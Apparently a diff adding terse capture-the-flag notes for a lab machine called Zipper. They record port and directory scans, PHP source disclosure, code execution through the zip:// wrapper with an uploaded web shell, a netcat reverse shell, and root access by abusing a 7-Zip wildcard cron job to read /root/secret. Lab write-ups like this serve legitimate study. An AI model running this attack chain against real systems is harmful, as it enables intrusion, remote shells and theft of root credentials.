@@ -1,0 +1,117 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.182.229 > Zipper.txt
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
+|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
+|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Zipper
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ gobuster dir -u http://192.168.182.229 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+home.php             (Status: 200) [Size: 3151]
+uploads              (Status: 403) [Size: 280]
+index.php            (Status: 200) [Size: 3151]
+http://192.168.182.229/index.php?file=home
+http://192.168.182.229/index.php?file=php://filter/convert.base64-encode/resource=index
+PD9waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwppZihpc3NldCgkZmlsZSkpCnsKICAgIGluY2x1ZGUoIiRmaWxlIi4iLnBocCIpOwp9CmVsc2UKewppbmNsdWRlKCJob21lLnBocCIpOwp9Cj8
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+    include("$file".".php");
+}
+else
+{
+include("home.php");
+}
+?>
+
+# refer to: https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38---------------------------------------
+
+upload shell.php
+
+http://192.168.182.229/index.php?file=zip://uploads/upload_1783654224.zip%23shell&cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# upload Ivan Sincek revshell php
+http://192.168.182.229/index.php?file=zip://uploads/upload_1783654519.zip%23sh443
+$ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.45.186] from (UNKNOWN) [192.168.182.229] 42746
+SOCKET: Shell has connected! PID: 6369
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Linux version 5.4.0-90-generic (buildd@lgw01-amd64-054) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021
+
+* *     * * *   root    bash /opt/backup.sh
+www-data@zipper:/var/www/html/uploads# cat /opt/backup.sh
+cat /opt/backup.sh
+#!/bin/bash
+password=`cat /root/secret`
+cd /var/www/html/uploads
+rm *.tmp
+7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
+
+www-data@zipper:/opt/backups$ cat backup.log
+cat backup.log
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /opt/backups/backup.zip
+--
+Path = /opt/backups/backup.zip
+Type = zip
+Physical Size = 6783
+
+Scanning the drive:
+11 files, 5177 bytes (6 KiB)
+
+Updating archive: /opt/backups/backup.zip
+
+Items to compress: 11
+
+
+Files read from disk: 11
+Archive size: 6783 bytes (7 KiB)
+
+Scan WARNINGS for files and folders:
+
+WildCardsGoingWild : No more files
+----------------
+Scan WARNINGS: 1
+
+www-data@zipper:/var/www/html/uploads$ ls -la
+ls -la
+total 52
+drwxr-xr-x 2 www-data www-data 4096 Jul 10 03:36 .
+drwxr-xr-x 3 www-data www-data 4096 Aug 12  2021 ..
+-rw-r--r-- 1 www-data www-data   32 Aug 12  2021 .htaccess
+-rw-r--r-- 1 www-data www-data    0 Aug 12  2021 @enox.zip
+lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
+-rw-r--r-- 1 www-data www-data  156 Aug 12  2021 upload_1628773085.zip
+-rw-r--r-- 1 www-data www-data  318 Jul 10 02:09 upload_1783649395.zip
+-rw-r--r-- 1 www-data www-data  227 Jul 10 02:12 upload_1783649547.zip
+
+# In 7-Zip syntax, the @ prefix has a very special meaning. It tells 7-Zip: "Do not compress this file. Instead, open this file, read it as a text list, and treat every line inside it as a filename that needs to be compressed."
+Because @enox.zip was passed first, 7-Zip treats enox.zip as its input instruction list.
+7-Zip opens enox.zip to read the list of files it's supposed to compress.
+Because enox.zip is a symlink, 7-Zip follows it and opens /root/secret instead.
+Since the backup script runs as root, it has the permissions to read inside the /root/ directory.
+
+# lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
+So "WildCardsGoingWild" is the content of /root/secret, 
+try this as root password
+www-data@zipper:/var/www/html/uploads$ su
+su
+Password: WildCardsGoingWild
+
+root@zipper:/var/www/html/uploads# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
